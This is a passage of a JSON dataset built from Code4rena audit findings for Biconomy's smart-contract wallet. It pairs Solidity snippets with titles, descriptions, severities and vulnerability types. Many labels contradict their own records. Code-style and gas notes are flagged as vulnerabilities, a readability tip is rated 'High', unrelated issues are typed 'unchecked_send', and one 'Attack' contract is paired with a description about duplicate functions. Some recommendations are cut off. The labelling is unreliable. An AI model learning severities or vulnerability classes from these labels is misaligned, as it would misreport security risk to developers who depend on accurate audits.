  },
  {
    "code": "BaseSmartAccount.validateUserOp",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "2. Improper Validation of Gas Limit in `BaseSmartAccount.validateUserOp`",
    "description": "Summary: The `BaseSmartAccount.validateUserOp` function does not properly validate the gas limit of `userOp` before executing it. This allows an attacker to cause an accidental denial of service (DoS) attack by specifying a very large gas limit in the `userOp` struct. Impact: An attacker could send a `userOp` with an unreasonably large gas limit to the `BaseSmartAccount` contract, potentially causing other operations within the same block to fail due to gas exhaustion. This could lead to a temporary disruption of services and loss of availability for the affected contract. Recommendation: The gas limit of `userOp` should be properly validated before executing the operation. This could be done by comparing the gas limit to some reasonable maximum value or by checking that the gas limit is not significantly larger than the average gas usage of previous operations.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_validateAndUpdateNonce",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "3. Incorrect handling of `initCode` field in `validateUserOp` function",
    "description": "Summary: The `validateUserOp` function does not correctly handle the `initCode` field in the `UserOperation` struct. If the `initCode` field is not empty, the function does not call `_validateAndUpdateNonce`, which can allow attackers to bypass nonce validation. Impact: Attackers could potentially replay transactions or create new accounts without incrementing the nonce, leading to a loss of funds and potentially leading to contract vulnerabilities being exploited. Recommendation: The `validateUserOp` function should include a check for the `initCode` field before calling `_validateAndUpdateNonce`. If `initCode` is not empty, `_validateAndUpdateNonce` should still be called to ensure proper nonce handling.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "biconomy.scw.proxy.implementation",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "1. Stored Implementation Slot Tampering",
    "description": "Summary: The contract has a constant defined as the keccak-256 hash of `biconomy.scw.proxy.implementation` subtracted by 1, which is used as a storage slot for the implementation address. However, this storage slot can be tampered with by any contract that has write access to storage. Impact: This vulnerability allows an attacker to change the implementation of the contract. This could potentially lead to the attacker being able to execute arbitrary code within the contract, or disrupt the intended functionality of the contract. Recommendation:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.033,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "execTransactionFromModule",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "1. Unauthorized module execution vulnerability",
    "description": "Summary: There is a vulnerability in the `execTransactionFromModule` function in the `ModuleManager` contract that allows any address to call the function and execute transactions on behalf of the contract. The issue is caused by the lack of a check to verify that the caller of the function is a whitelisted module. Impact: An attacker can exploit this vulnerability to execute arbitrary transactions on behalf of the contract, potentially leading to financial loss or reputation damage for the contract owner. Recommendation:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.025,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "SecuredTokenTransfer",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "1. Improper input validation in SecuredTokenTransfer contract",
    "description": "Summary: The `SecuredTokenTransfer` contract does not properly validate the input parameters passed to the `transferToken` function, specifically the `token` and `receiver` addresses. This allows an attacker to potentially transfer tokens to an unintended address or perform other malicious actions. Impact: An attacker could exploit this vulnerability to transfer tokens to an unintended address, potentially leading to financial loss for the intended recipient. Recommendation:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n modifier onlyOwner(){\n        require(msg.sender == address(this) || owner == msg.sender  , \"Only Owner\");\n        _;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Quality Assurance -",
    "description": "Simple Account - 1 - The function call in the modifier is not necessary, we can also use this in the modifier and achieve the same results.  The use of the modifier is suggested as that makes the code clean and readable. Also, it saves some gas on the way as well. So, instead of writing the modifier the way it's written, it can also be written as modifier onlyOwner(){ require(msg.sender == address(this) || owner == msg.sender  , \"Only Owner\"); _;",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.126,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodePacked(<bytes>,<bytes>)",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "[NC-5] Use `bytes.concat()`",
    "description": "Solidity version 0.8.4 introduces [`bytes.concat()`](https://docs.soliditylang.org/en/v0.8.17/types.html?highlight=bytes.concat#the-functions-bytes-concat-and-string-concat) vs `abi.encodePacked(<bytes>,<bytes>)`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.033,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "```solidity \nFile: BaseSmartAccount.sol\nFile: Proxy.sol\nFile: SmartAccount.sol\nFile: SmartAccountFactory.sol\nFile: interfaces/ISignatureValidator.sol\nFile: interfaces/ERC1155TokenReceiver.sol\nFile: interfaces/ERC721TokenReceiver.sol\nFile: interfaces/ERC777TokensRecipient.sol\nFile: interfaces/IERC1271Wallet.sol\nFile: common/Singleton.sol\nFile: common/SignatureDecoder.sol\nFile: base/Executor.sol\nFile: common/SecuredTokenTransfer.sol\nFile: base/ModuleManager.sol\nFile: base/FallbackManager.sol\nFile: interfaces/IERC165.sol\nFile: libs/Math.sol\nFile: libs/LibAddress.sol\nFile: paymasters/PaymasterHelpers.sol\nFile: paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\nFile: common/Enum.sol\nFile: libs/MultiSend.sol\nFile: MultiSendCallOnly.sol",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[Low-02] Multiple Solidity version used",
    "description": "Below contracts using Solidity ```0.8.12``` File: BaseSmartAccount.sol File: Proxy.sol File: SmartAccount.sol File: SmartAccountFactory.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.751,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: lib/MultiSendCallOnly.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol#L21-L59\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[Low-03] Contracts has payable function to receive ETH, but there is no rescue function to send out ETH from those contract",
    "description": "*Instances(4)* File: BaseSmartAccount.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L116-L120 File: Proxy.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol#L16",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.179,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: SmartAccount.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109-L114\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[Low-4] Changing Owner or setting any most important addresses should be a 2 Step-process",
    "description": "*Instances(1)* File: SmartAccount.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L109-L114",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.162,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");  // @audit no need to check\n        require(address(_entryPoint) == address(0), \"Already initialized\");  // @audit no need to check\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[Low-5] Could some lines of code(checks) remove from function ```init()```",
    "description": "As here is a ```initializer``` modifier that will help to initialize state variable only once through ```init()`` and ```owner``` and ```_entryPoint``` by default holds default value. I mean this function only callable a single time, so no need to checks for ```owner == address(0)``` and ```address(_entryPoint) == address(0)``` so these 2 line could removed. function init(address _owner, address _entryPointAddress, address _handler) public override initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.718,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: common/SignatureDecoder.sol\n\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/SignatureDecoder.sol#L10-L34\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[Low-6] Absence of signature length check that ```signature``` that pass as a function parameter before ```v,r,s``` derived from it",
    "description": "*Instances(1)* File: common/SignatureDecoder.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/SignatureDecoder.sol#L10-L34",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.183,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: base/FallbackManager.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol#L26-L29\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[Low-07] While setting fallbackHandler via ```setFallbackHandler()``` missing of zero-address check for function input",
    "description": "*Instances(1)* File: base/FallbackManager.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol#L26-L29",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.176,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " can never be changed\n\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L8\n\nConsider removing the immutable keyword and add a setter function for the aforementioned variable for the case that the implementation needs to be changed.\n\n9) Missing event for ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "1) Typographical error: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L74",
    "description": "2) Duplicate initialization check: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L168 The `owner == address(0)` check is sufficient. 3) name mismatch for `pullTokens` https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L455 The function should be named `pushTokens` because it doesn't execute a `transferFrom` but a `(safe)transfer`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.332,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nfunction validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)\n    external view override returns (bytes memory context, uint256 deadline) {\n        (requiredPreFund);\n        bytes32 hash = getHash(userOp);\n\n        PaymasterData memory paymasterData = userOp.decodePaymasterData();\n        uint256 sigLength = paymasterData.signatureLength;\n\n        //ECDSA library supports both 64 and 65-byte long signatures.\n        // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"\n        require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\n        require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");\n        require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");\n        return (userOp.paymasterContext(paymasterData), 0);\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## [L-01] Remove unused input/unnamed parameter",
    "description": "File: VerifyingSingletonPaymaster, line: 97 - [VerifyingSingletonPaymaster.sol#L97](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97) The `/*userOpHash*/` is commented and not used.  Remove unused parameter. function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund) external view override returns (bytes memory context, uint256 deadline) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-03] Use named import",
    "description": "files: All files The current form of relative path import is not recommended for use because it can unpredictably pollute the namespace. Instead, the Solidity docs recommend specifying imported symbols explicitly. https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files Recommended Mitigation Steps",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.067,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nconst config: HardhatUserConfig = {\n  // defaultNetwork: \"ganache\",\n  solidity: {\n    compilers: [\n      {\n        version: \"0.8.12\",\n        settings: {\n          optimizer: { enabled: true, runs: 200 },\n        },\n      },\n      {\n        version: \"0.8.4\",\n        settings: {\n          optimizer: { enabled: true, runs: 200 },\n        },\n      },\n      {\n        version: \"0.8.9\",\n        settings: {\n          optimizer: { enabled: true, runs: 200 },\n        },\n      },\n    ],\n  },\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-04] Solidity compiler optimizations can be problematic",
    "description": "File: hardhat.config.js const config: HardhatUserConfig = { // defaultNetwork: \"ganache\", solidity: { compilers: [",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 27,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.489,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\"dependencies\": {\n    \"@account-abstraction/contracts\": \"^0.3.0\",\n    \"@account-abstraction/sdk\": \"^0.3.0\",\n    \"@chainlink/contracts\": \"^0.4.1\",\n    \"@ethersproject/abstract-signer\": \"^5.6.2\",\n    \"@ethersproject/constants\": \"^5.6.1\",\n    \"@nomiclabs/hardhat-etherscan\": \"^2.1.6\",\n    \"@openzeppelin/contracts\": \"^4.7.3\",\n    \"@openzeppelin/contracts-upgradeable\": \"^4.7.3\",\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-05] Use Latest Openzeppelin Library versions",
    "description": "The lastest version of Openzeppelin is 4.8.0. This project uses version 4.7.4 \"dependencies\": { \"@account-abstraction/contracts\": \"^0.3.0\", \"@account-abstraction/sdk\": \"^0.3.0\", \"@chainlink/contracts\": \"^0.4.1\",",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.377,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nfunction setEntryPoint(IEntryPoint _entryPoint) public onlyOwner {\n        entryPoint = _entryPoint;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-06] Missing Event for critical parameter change",
    "description": "File: BasePaymaster.sol, line 24. function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner { entryPoint = _entryPoint; } Recommended Mitigations steps",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.108,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontract Attack {\n    constructor(address contractAddress) {\n        VerifyingSingletonPaymaster(contractAddress).depositFor{value: 1}(address(this));\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "1. **Function duplicate**:",
    "description": "There are 2 functions that implmenet the same logic- They both accept batchId and return nonces[batchId]. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L155-L159 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L97-L99 2. **Wrong error message**: Should be invalid _handler not Invalid Entrypoint.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.16,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::83 => * @return deadline the last block timestamp this operation is valid, or zero if it is valid indefinitely.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::84 => *      Note that the validation code cannot use block.timestamp (or block.number) directly.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-01] Use of Block.timestamp",
    "description": "Block timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::83 => * @return deadline the last block timestamp this operation is valid, or zero if it is valid indefinitely. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::84 => *      Note that the validation code cannot use block.timestamp (or block.number) directly.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.381,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::550 => receive() external payable {}\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::540 => receive() external payable {}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-02] Unused receive()/fallback() function",
    "description": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::550 => receive() external payable {} 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::540 => receive() external payable {}",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.243,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::347 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::34 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::70 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::71 => bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(code)));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::342 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-03] abi.encodePacked() should not be used with dynamic types when passing the result to a hash function such as keccak256()",
    "description": "Use abi.encode() instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. abi.encodePacked(0x123,0x456) => 0x123456 => abi.encodePacked(0x1,0x23456), but abi.encode(0x123,0x456) => 0x0...1230...456). Unless there is a compelling reason, abi.encode should be preferred. If there is only one argument to abi.encodePacked() it can often be cast to bytes() or bytes32() instead. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::347 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::34 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index)))); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::70 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index)))); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::71 => bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(code)));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.935,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-04] require() should be used instead of assert()",
    "description": "require() should be used for checking error conditions on inputs and return values while assert() should be used for invariant checking 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.183,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::20 => function setupModules(address to, bytes memory data) internal {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-05] Events not emitted for important state changes",
    "description": "When changing state variables events are not emitted. Emitting events allows monitoring activities with off-chain monitoring tools. 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol::20 => function setupModules(address to, bytes memory data) internal {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.158,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-06] Upgradeable contract is missing a __gap[50] storage variable to allow for new storage variables in later versions",
